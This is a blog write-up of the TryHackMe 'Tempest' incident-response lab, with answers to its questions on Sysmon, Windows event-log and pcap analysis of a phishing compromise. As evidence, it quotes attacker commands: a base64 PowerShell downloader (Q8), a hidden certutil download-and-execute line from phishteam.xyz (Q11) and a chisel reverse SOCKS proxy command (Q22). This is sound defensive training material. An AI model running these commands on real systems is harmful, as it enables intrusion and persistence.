---
author: Ricard Alcaraz Mancebo
title: Tempest - TryHackMe
tags:
  - Cybersecurity
  - Blue Team
  - TryHackMe
  - Digital Forensics
languages:
  - eztools
  - wireshark
  - cyberchef
  - virustotal
image:
  url: https://assets.tryhackme.com/img/logo/tryhackme_logo_full.svg
  alt: tryhackme
description: My notes solving Tempest - TryHackMe
pubDate: 2025-09-08T19:44:00.000+02:00
---
## Scenario
This room aims to introduce the process of analysing endpoint and network logs from a compromised asset. Given the artefacts, we will aim to uncover the incident from the Tempest machine. In this scenario, you will be tasked to be one of the Incident Responders that will focus on handling and analysing the captured artefacts of a compromised machine.

## Documents Provided
- capture.pcap
- sysmon.evtx
- windows.evtx

## Task 3
In this task we are asked to obtain the SHA256 of each file that we wull use for this investigation. The information we need to do it is already on the task, we will use Powershell to obtain the hashes.

```powershell
 Get-FileHash -Algorithm SHA256 [filename]
```

Also as the tasks says I will create the parsed csv of the event log sysmon as the task suggests. I will use the following command:

```
.\EvtxECmd.exe -f "C:\Users\user\Desktop\Incident Files\sysmon.evtx" --csv "C:\Users\user\Desktop\Incident Files\out"
```

### Q1: What is the SHA256 hash of the capture.pcapng file?

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6
  </div>
</details>

### Q2: What is the SHA256 hash of the sysmon.evtx file?

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F
  </div>
</details>

### Q3: What is the SHA256 hash of the windows.evtx file?

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60
  </div>
</details>

## Task 4
This challenge has a guideline all along so it makes it easier for people stating on these kind of analysis, such as me! This makes it easier and provides you a path to follow that you can later put in practice in other scenarios.
So following this I will open `Timeline Explorer` to open the sysmon log as suggested.

![]()

### Q4: The user of this machine was compromised by a malicious document. What is the file name of the document?

In the description of the task we have a clue, that we should investigate child processes of WinWord.exe, this question Its more related to the executable itself.
So what I did was search for the name of the file in the search bar, and then identify its process ID, to again search for it. In this case since its the begining it could be related to a Process Creation, or in sysmon Event ID 1.
Searching a little bit we will find the name of the file.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    free_magicules.doc
  </div>
</details>

### Q5: What is the name of the compromised user and machine?

We can find this information in the same event we found, care with the format to answer the question.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    benimaru-TEMPEST
  </div>
</details>

### Q6: What is the PID of the Microsoft Word process that opened the malicious document?

This also we found it when I started looking for the file, so we already have it.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    496
  </div>
</details>

#### Q7: Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?

Now, still searching for the process ID 496, we can look what `Map Description` does contain a `DNS Event (DNS query)`. Following the event of the previous document we can find two, one named `ecs.office.com` and the other `phishteam.xyz`, we can see that one of these is already suspicious by the name and the TLD, if we investigate the event of the suspicious event we will find the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    167.71.199.191
  </div>
</details>

### Q8: What is the base64 encoded string in the malicious payload executed by the document?

For this one since its an execution its probably another sysmon event ID 1, a process creation, so we can check the following process creations and also we know that ist from the document so the parent process ID will be the one we found at **Q6**. Knowing this we will find the answer in the `Executable Info` of the event.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
  </div>
</details>

### Q9: What is the CVE number of the exploit used by the attacker to achieve a remote code execution? 

The previous event contains a script, this will give us the clue. If we search part of the script we will find information about the CVE.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    2022-30190
  </div>
</details>

## Task 5

### Q10: The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?
Now that we have the base64 string from **Q8** we can decode it, and it will have a path, we only have to guess un part of the path, that is related to the ApplicationData. We know the username, and the other part we can guess it if we know how the AppData folder is structured.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
  </div>
</details>

### Q11: The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?

For this one we already have some clues in the task, we know the parent process `explorer.exe`, the sysmon ID to search and the user. searching with this information will give us the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
  </div>
</details>

### Q12: Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?

We can just search the name of the file downloaded and we will find an event of the execution of the file, that will provide us the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
  </div>
</details>


## Q13: The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?

Having the previous answer we also can obtain the ProcessID of it, so I started looking for other processes related with this ProcessID, mainly DNS queries. We will find a DNS query to a domain that you will see that already looks suspicious, having that you will also find the IP of that domain, and searching for that IP you will also find in a natwork connection event which port it is using for the connection.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    resolvecyber.xyz:80
  </div>
</details>

## Task 6

### Q14: What is the URL of the malicious payload embedded in the document?

Now we have to open the network log file, I will use Wireshark. Then I will check the http packets, we have the clue on the task description. There we will see the previous `.doc` file that we detected on the system logs, and right after we will see a file retrieved from the same suspicious domain, this is the URL that was embedded and also called. If we could we also could analyse the `.doc` but its not available.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    http://phishteam.xyz/02dcf07/index.html
  </div>
</details>

### Q15: What is the encoding used by the attacker on the c2 connection?

Now we can analyze the different requests after the download of the malicious executable that we have identified, doing it we can see that there are several requests that contains long string, these seem to be the strings we have to decode. If we copy one of these and paste it as an input on `CyberChef` it will help us answer the question if we use the magic wand.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    base64
  </div>
</details>

### Q16: The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?

We just have to analyze the previous requests and see the parameter used in order to execute the query that its requesting.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    q
  </div>
</details>

### Q17: The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?

The answer is already on the requests we are analyzing.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    /9ab62b5
  </div>
</details>

### Q18: What is the HTTP method used by the binary?

Nothing new, we already know what kind of requests are being used.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    GET
  </div>
</details>

### Q19: Based on the user agent, what programming language was used by the attacker to compile the binary? 

Analyzing the header of any of these requests we will find the answer on the `user-agent` parameter.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    nim
  </div>
</details>

## Task 7

### Q20: The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?

For this one I scrolled down untill I saw a requests that was different than the encoded ones, and then I stared to decode the lasts requests, if we do this we will find that the user had a file `automation.ps1` in the Desktop, that contained its password and he retrieved the information inside of it, so just use `CyberChef` and you will find the answer in one of the requests.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    infernotempest
  </div>
</details>

### Q21: The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?

Here we already have found the result of the enumeration that was encoded in one of the requests from checking different ones from previous question, there we will see all the ports open, so one thing we can do is search each port and try to see if its possible to setup a remote shell from one of these, at some point we will find the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    5985
  </div>
</details>

### Q22: The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?

Analyzing the following commands we will see that later a executable is downloaded, and then executed using a powershell command. For this one we have to come back to the sysmon logs and find the command realted to the executable downloaded, there we will find the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
  </div>
</details>

### Q23: What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?

In the same event log we can find the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
  </div>
</details>

### Q24: What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.

Here we need to use a tool to analyze this previous hash, I will use `VirusTotal`. There we will find the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    chisel
  </div>
</details>

### Q25: The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate? 

In the sysmon logs we have to locate when does the socks command was executed I look for the next process creation, once we have it we have to find the name of the service of the executable.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    winrm
  </div>
</details>

## Task 8

### Q26: After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?

Still in the same search as before we can continue looking at the sysmon logs, and we will find another executable, searching for its name we will find the SHA256 hash of the file.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D
  </div>
</details>

### Q27: Based on the SHA256 hash of the binary, what is the name of the tool used?

Same as before, we can use `VirusTotal` to seach the SHA256, and the we will find the name of the tool.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    printspoofer
  </div>
</details>

### Q28: The tool exploits a specific privilege owned by the user. What is the name of the privilege?

We just have to search a little bit about the previous tool on the internet to see what privilege its exploit.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    SeImpersonatePrivilege
  </div>
</details>

### Q29: Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?

Following the nexts process creations we can see the name of the another executable.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    final.exe
  </div>
</details>

### Q30: The binary connects to a different port from the first c2 connection. What is the port used?

Going back to wireshark, looking for the executable of the previous question we can see again a pattern we have seen before, if we take a look at the port used this time we will find the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    8080
  </div>
</details>

## Task 9

### Q31: Upon achieving SYSTEM access, the attacker then created two users. What are the account names?

Now lets take a look at the `windows.etvx`, if we search for new users created we will find the answer, the EventID for user creation is `4720`, and we will find the name of the users.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    shion,shuna
  </div>
</details>

### Q32: Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?

